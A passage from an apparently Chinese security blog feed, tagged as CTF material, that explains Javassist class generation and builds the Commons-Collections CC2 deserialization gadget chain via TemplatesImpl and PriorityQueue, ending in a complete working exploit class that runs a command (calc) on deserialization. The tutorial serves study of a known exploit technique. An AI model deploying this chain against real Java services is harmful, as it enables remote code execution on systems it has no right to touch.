class="line">test.addConstructor(constructor);</span><br></pre></td></tr></table></figure><p>使用<code>CtClass</code>类的<code>makeClassInitializer()</code>可以为构建的类添加静态代码块，该方法返回一个<code>CtConstructor</code>类型的对象，静态代码块不需要使用<code>addConstructor()</code>方法去添加</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">constructor1.setBody(<span class="string">&quot;System.out.println(\&quot;123\&quot;);&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>CtClass</code>类的<code>writeFile()</code>方法可以将创建的类的类文件导出到定义的目录</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">test.writeFile(<span class="string">&quot;src/main/java/org/example&quot;</span>);</span><br></pre></td></tr></table></figure><p>在指定目录下便会出现<code>test.class</code>文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String testField;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testMethod</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> var1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="加载类对象"><a href="#加载类对象" class="headerlink" title="加载类对象"></a>加载类对象</h3><p>使用<code>CtClass</code>类的<code>toBytecode()</code>可以将对象转化为字节码数组</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytes = test.toBytecode();</span><br></pre></td></tr></table></figure><p><code>ClassLoader</code>类的<code>defineClass()</code>方法用于将类加载到内存中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, off, len, <span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len, ProtectionDomain protectionDomain)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        protectionDomain = preDefineClass(name, protectionDomain);</span><br><span class="line">        <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> defineClassSourceLocation(protectionDomain);</span><br><span class="line">        Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);</span><br><span class="line">        postDefineClass(c, protectionDomain);</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该方法被<code>protected</code>修饰，可以通过反射去调用它</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ClassLoader&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">method.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; invoke = (Class&lt;?&gt;) method.invoke(classLoader,bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">invoke.newInstance();</span><br></pre></td></tr></table></figure><p><code>invoke.newInstance()</code>会加载<code>test</code>类并实例化，触发静态代码块的执行</p><br/><h2 id="依赖TemplatesImpl的CC2链构建路径"><a href="#依赖TemplatesImpl的CC2链构建路径" class="headerlink" title="依赖TemplatesImpl的CC2链构建路径"></a>依赖TemplatesImpl的CC2链构建路径</h2><p>该链利用恶意的字节码文件生成恶意对象来触发命令执行，在<code>TemplatesImpl</code>的<code>defineTransletClasses()</code>方法中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该方法帮我们获取了<code>loader</code>，<code>_bytecodes</code>可以设置为我们构建的恶意类字节码数组，注意到如果我们的恶意类的父类不为<code>ABSTRACT_TRANSLET</code>就会导致<code>_transletIndex</code>为-1抛出异常终止程序，这在上面可以找到</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">_transletIndex</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>此外，<code>_tfactory</code>被默认设置为空，若不处理会造成空指针异常，可通过反射修改</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>条件符合后，我们的恶意类字节码就会被<code>loader</code>加载进内存，保存进<code>_class</code>数组中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">_class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line"><span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if this is the main class</span></span><br><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">_transletIndex = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来寻找上层方法，在同类的<code>getTransletInstance()</code>发现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">            translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>_class</code>为空时，调用了<code>defineTransletClasses()</code>方法，但是有个前提是<code>_name</code>不为空，该字段默认为空且被<code>private</code>修饰，但也可以通过反射修改</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">_name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>后面，<code>_class[_transletIndex].newInstance()</code>说明此处恶意类被实例化，这也是该链的终点。继续寻找调用了<code>getTransletInstance()</code>的上层方法，在同类的<code>newTransformer()</code>中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用<code>newTransformer()</code>是通过<code>InvokerTransformer</code>进行的，在<code>transformingComparator</code>执行<code>compare()</code>方法时</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们需要构造的<code>InvokerTransformer</code>需要调用<code>newTransformer()</code>方法，所以<code>obj1</code>或<code>obj2</code>需要是一个<code>TemplatesImpl</code>实例，往上追溯<code>siftDownUsingComparator()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>obj1</code>和<code>obj2</code>分别对应<code>(E) c</code>和<code>(E) queue[right]</code>，其实都是<code>queue[]</code>数组的元素，只需要让其数组里面都是<code>TemplatesImpl</code>实例就好了，<code>queue[]</code>数组在<code>offer()</code>中被赋值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">offer</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= queue.length)</span><br><span class="line">            grow(i + <span class="number">1</span>);</span><br><span class="line">        size = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">            queue[<span class="number">0</span>] = e;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftUp(i, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>offer()</code>的参数不还是从<code>add()</code>中传进来的嘛！所以把原来的传进去的值改成<code>TemplatesImpl</code>实例就行了，下面正式构造链</p><p>构建恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">test.setSuperclass(superClass);</span><br><span class="line"><span class="type">byte</span>[] bytes = test.toBytecode();</span><br></pre></td></tr></table></figure><p>实例化<code>TemplatesImpl</code>对象并通过反射赋值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">name.set(templatesImpl, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">bytecodes.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactory.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure><p>构建<code>InvokerTransformer</code>对象指向<code>TemplatesImpl</code>类的<code>newTransformer()</code>方法，构建<code>TransformingComparator</code>对象使其<code>compare()</code>方法触发<code>InvokerTransformer</code>对象的<code>transform()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br></pre></td></tr></table></figure><p>构建<code>PriorityQueue</code>对象，依然要处理提前终止的问题，这里的思路是不使用<code>add()</code>方法而是利用反射直接修改<code>size</code>和<code>queue</code>字段的值，使其传递的<code>obj</code>为<code>TemplatesImpl</code>对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue&lt;TemplatesImpl&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl,templatesImpl&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">size.set(priorityQueue, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>由此，依赖<code>TemplatesImpl</code>的CC2链构造完毕，全链如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        test.setSuperclass(superClass);</span><br><span class="line">        <span class="type">byte</span>[] bytes = test.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templatesImpl, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        PriorityQueue&lt;TemplatesImpl&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl,templatesImpl&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(priorityQueue, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        deserialize(<span class="string">&quot;cc2-2.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc2-2.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不总结了，感觉前面说的够清晰了（嘿</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代理机制及CC1链拾遗补阙</title>
      <link href="/2025/12/17/Java%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6%E5%8F%8ACC1%E9%93%BE%E6%8B%BE%E9%81%97%E8%A1%A5%E9%98%99/"/>
      <url>/2025/12/17/Java%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6%E5%8F%8ACC1%E9%93%BE%E6%8B%BE%E9%81%97%E8%A1%A5%E9%98%99/</url>
      
